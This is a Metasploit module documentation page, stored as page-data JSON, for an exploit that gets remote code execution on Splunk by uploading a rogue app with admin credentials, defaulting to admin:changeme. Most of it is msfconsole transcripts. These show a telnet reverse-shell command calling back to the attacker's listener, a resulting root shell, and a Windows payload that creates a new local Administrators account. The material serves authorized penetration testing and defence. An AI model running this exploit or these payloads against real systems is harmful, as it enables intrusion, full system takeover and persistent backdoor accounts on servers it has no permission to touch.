{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/splunk_upload_app_exec","result":{"data":{"moduleMetadataJson":{"id":"89a233bf-0940-5c25-a26b-da27d053e8cd","name":"Splunk Custom App Remote Code Execution","fullname":"exploit/multi/http/splunk_upload_app_exec","description":"This module exploits a feature of Splunk whereby a custom application can be\n        uploaded through the web based interface. Through the 'script' search command a\n        user can call commands defined in their custom application which includes arbitrary\n        perl or python code. To abuse this behavior, a valid Splunk user with the admin\n        role is required. By default, this module uses the credential of \"admin:changeme\",\n        the default Administrator credential for Splunk. Note that the Splunk web interface\n        runs as SYSTEM on Windows, or as root on Linux by default. This module has been\n        tested successfully against Splunk 5.0, 6.1, 6.1.1 and 7.2.4.\n        Version 7.2.4 has been tested successfully against OSX as well","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/splunk_upload_app_exec","documentationSlug":"/modules/documentation/exploit/multi/http/splunk_upload_app_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits a feature of Splunk whereby a custom application can be\nuploaded through the web based interface. Through the <code class=\"language-text\">script</code> search command a\nuser can call commands defined in their custom application which includes arbitrary\nperl or python code. To abuse this behavior, a valid Splunk user with the admin\nrole is required. By default, this module uses the credential of \"admin:changeme\",\nthe default Administrator credential for Splunk.\nNote that the Splunk web interface runs as SYSTEM on Windows, or as root on Linux by default.\nThis module has been tested successfully against:</p>\n<ul>\n<li>5.0 (<a href=\"https://github.com/rapid7/metasploit-framework/pull/1138#issue-3277564\">Ubuntu 10.04</a>, <a href=\"https://github.com/rapid7/metasploit-framework/pull/1138#issue-3277564\">Windows XP and Windows Server 2003 SP2</a> with splunk-5.0.1-143156)</li>\n<li>6.1, 6.1.1</li>\n<li>7.2.4 (OSX 10.14.3, Windows 10 10.0.17134.1, CentOS7 3.10.0-957.1.3.el7.x86_64)</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/http/splunk_upload_app_exec</code></li>\n<li>Set required variables (you will need admin credentials)</li>\n<li>Do: <code class=\"language-text\">SET LHOST [ip]</code></li>\n<li>Do: <code class=\"language-text\">SET RHOST [ip]</code></li>\n<li>\n<p>Set a payload: </p>\n<ul>\n<li>If targeting linux or macos the payload <code class=\"language-text\">cmd/unix/reverse_python</code> will be automatically selected.</li>\n<li>If targeting windows the payload <code class=\"language-text\">cmd/windows/adduser</code> will be automatically selected.</li>\n</ul>\n</li>\n<li>You should get either a reverse shell on port 4444 via the predefined handler (Linux/OSX) or a new user in case (windows target)</li>\n</ol>\n<h2 id=\"external-demo\" style=\"position:relative;\"><a href=\"#external-demo\" aria-label=\"external demo permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>External Demo</h2>\n<ul>\n<li><a href=\"http://blog.7elements.co.uk/2012/11/splunk-with-great-power-comes-great-responsibility.html\">First PoC</a> </li>\n<li><a href=\"http://blog.7elements.co.uk/2012/11/abusing-splunk-with-metasploit.html\">Metasploit module how-to</a></li>\n<li><a href=\"http://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Script\">SPLUNK API</a></li>\n</ul>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>EnableOverwrite</strong>\nOverwrites an app of the same name. Needed if you change the app code in the tgz.\nDefault is <code class=\"language-text\">false</code></p>\n<p>  <strong>USERNAME</strong>\nUsername for Splunk. Default is <code class=\"language-text\">admin</code></p>\n<p>  <strong>PASSWORD</strong>\nDefault is <code class=\"language-text\">changeme</code></p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"tested-against-724-running-on-osx-10143\" style=\"position:relative;\"><a href=\"#tested-against-724-running-on-osx-10143\" aria-label=\"tested against 724 running on osx 10143 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested against 7.2.4 running on OSX 10.14.3</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/http/splunk_upload_app_exec) &gt;\nmsf5 exploit(multi/http/splunk_upload_app_exec) &gt; set RHOST 172.16.165.1\nRHOST =&gt; 172.16.165.1\nmsf5 exploit(multi/http/splunk_upload_app_exec) &gt; set password splunksplunk\npassword =&gt; splunksplunk\nmsf5 exploit(multi/http/splunk_upload_app_exec) &gt; show targets\n\nExploit targets:\n\n Id  Name\n --  ----\n 0   Automatic\n 1   Splunk &gt;= 7.2.4 / Linux\n 2   Splunk &gt;= 7.2.4 / Windows\n 3   Splunk &gt;= 7.2.4 / OSX\n 4   Splunk &gt;= 5.0.1 / Linux\n 5   Splunk &gt;= 5.0.1 / Windows\n\n\nmsf5 exploit(multi/http/splunk_upload_app_exec) &gt; set target 3\ntarget =&gt; 3\nmsf5 exploit(multi/http/splunk_upload_app_exec) &gt; exploit\n\n[*] Started reverse TCP double handler on 172.16.165.206:4444\n[*] Using command: sh -c &#39;(sleep 3733|telnet 172.16.165.206 4444|while : ; do sh &amp;&amp; break; done 2&gt;&amp;1|telnet 172.16.165.206 4444 &gt;/dev/null 2&gt;&amp;1 &amp;)&#39;\n[*] Authenticating...\n[*] Fetching state token from /en-US/manager/appinstall/_upload\n[*] Uploading file upload_app_exec.tgz\n[+] upload_app_exec successfully uploaded\n[*] Invoking script command\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo 8kNbt70jYB3aJKPm;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket A\n[*] A: &quot;sh: line 2: Connected: command not found\\r\\nsh: line 3: Escape: command not found\\r\\n8kNbt70jYB3aJKPm\\r\\n&quot;\n[*] Matching...\n[*] B is input...\n[*] Command shell session 1 opened (172.16.165.206:4444 -&gt; 172.16.165.1:51512) at 2019-03-17 22:12:33 +0100</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"tested-against-splunk-501-143156-on-ubuntu-1004\" style=\"position:relative;\"><a href=\"#tested-against-splunk-501-143156-on-ubuntu-1004\" aria-label=\"tested against splunk 501 143156 on ubuntu 1004 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested against splunk-5.0.1-143156 on Ubuntu 10.04</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/splunk_upload_app_exec \nmsf  exploit(splunk_upload_app_exec) &gt; show options\n\nModule options (exploit/multi/http/splunk_upload_app_exec):\n\n   Name             Current Setting                                                                         Required  Description\n   ----             ---------------                                                                         --------  -----------\n   PASSWORD         changeme                                                                                yes       The password for the specified username\n   Proxies                                                                                                  no        Use a proxy chain\n   RHOST                                                                                                    yes       The target address\n   RPORT            8000                                                                                    yes       The target port\n   SPLUNK_APP_FILE  /Users/juan/Projects/git/metasploit-framework/data/exploits/splunk/upload_app_exec.tgz  yes       The &quot;rogue&quot; Splunk application tgz\n   USERNAME         admin                                                                                   yes       The username with admin role to authenticate as\n   VHOST                                                                                                    no        HTTP server virtual host\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Splunk 5.0.1 / Linux\n\n\nmsf  exploit(splunk_upload_app_exec) &gt; set RHOST 192.168.1.137\nRHOST =&gt; 192.168.1.137\nmsf  exploit(splunk_upload_app_exec) &gt; rexploit\n[*] Reloading module...\n\n[*] Using command: sh -c &#39;(sleep 4597|telnet 192.168.1.129 4444|while : ; do sh &amp;&amp; break; done 2&gt;&amp;1|telnet 192.168.1.129 4444 &gt;/dev/null 2&gt;&amp;1 &amp;)&#39;\n[*] Authenticating...\n[*] Started reverse double handler\n[*] Fetching csrf token from /en-US/manager/launcher/apps/local\n[*] Uploading file upload_app_exec.tgz\n[*] upload_app_exec successfully uploaded\n[*] Fetching csrf token from /en-US/app/upload_app_exec/flashtimeline\n[*] Invoking script command\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo uyYJGuNfu2AetK0N;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket A\n[*] A: &quot;uyYJGuNfu2AetK0N\\r\\n&quot;\n[*] Matching...\n[*] B is input...\n[*] Command shell session 1 opened (192.168.1.129:4444 -&gt; 192.168.1.137:41432) at 2012-12-07 11:53:35 +0100\n\nid\nuid=0(root) gid=0(root) groups=0(root)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"tested-against-splunk-501-143156-on-windows-xp\" style=\"position:relative;\"><a href=\"#tested-against-splunk-501-143156-on-windows-xp\" aria-label=\"tested against splunk 501 143156 on windows xp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested against splunk-5.0.1-143156 on Windows XP</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf  exploit(splunk_upload_app_exec) &gt; show targets\n\nExploit targets:\n\n   Id  Name\n   --  ----\n   0   Splunk 5.0.1 / Linux\n   1   Splunk 5.0.1 / Windows\n\n\nmsf  exploit(splunk_upload_app_exec) &gt; set target 1\ntarget =&gt; 1\nmsf  exploit(splunk_upload_app_exec) &gt; set payload cmd/windows/adduser \npayload =&gt; cmd/windows/adduser\nmsf  exploit(splunk_upload_app_exec) &gt; show options\n\nModule options (exploit/multi/http/splunk_upload_app_exec):\n\n   Name             Current Setting                                                                         Required  Description\n   ----             ---------------                                                                         --------  -----------\n   PASSWORD         changeme                                                                                yes       The password for the specified username\n   Proxies                                                                                                  no        Use a proxy chain\n   RHOST            192.168.1.137                                                                           yes       The target address\n   RPORT            8000                                                                                    yes       The target port\n   SPLUNK_APP_FILE  /Users/juan/Projects/git/metasploit-framework/data/exploits/splunk/upload_app_exec.tgz  yes       The &quot;rogue&quot; Splunk application tgz\n   USERNAME         admin                                                                                   yes       The username with admin role to authenticate as\n   VHOST                                                                                                    no        HTTP server virtual host\n\n\nPayload options (cmd/windows/adduser):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   CUSTOM                   no        Custom group name to be used instead of default\n   PASS    Metasploit$1     yes       The password for this user\n   USER    metasploit       yes       The username to create\n   WMIC    false            yes       Use WMIC on the target to resolve administrators group\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   1   Splunk 5.0.1 / Windows\n\n\nmsf  exploit(splunk_upload_app_exec) &gt; rexploit\n[*] Reloading module...\n\n[*] Using command: cmd.exe /c net user metasploit Metasploit$1 /ADD &amp;&amp; net localgroup Administrators metasploit /ADD\n[*] Authenticating...\n[*] Fetching csrf token from /en-US/manager/launcher/apps/local\n[*] Uploading file upload_app_exec.tgz\n[*] upload_app_exec successfully uploaded\n[*] Fetching csrf token from /en-US/app/upload_app_exec/flashtimeline\n[*] Invoking script command</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>After that, on the victim machine:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">C:\\Documents and Settings\\Administrator&gt;net user metasploit\nUser name                    metasploit\nFull Name\nComment\nUser&#39;s comment\nCountry code                 000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            12/6/2012 11:19 PM\nPassword expires             1/18/2013 10:07 PM\nPassword changeable          12/6/2012 11:19 PM\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script\nUser profile\nHome directory\nLast logon                   Never\n\nLogon hours allowed          All\n\nLocal Group Memberships      *Administrators       *Users\nGlobal Group memberships     *None\nThe command completed successfully.\n\n\nC:\\Documents and Settings\\Administrator&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"89a233bf-0940-5c25-a26b-da27d053e8cd"}}}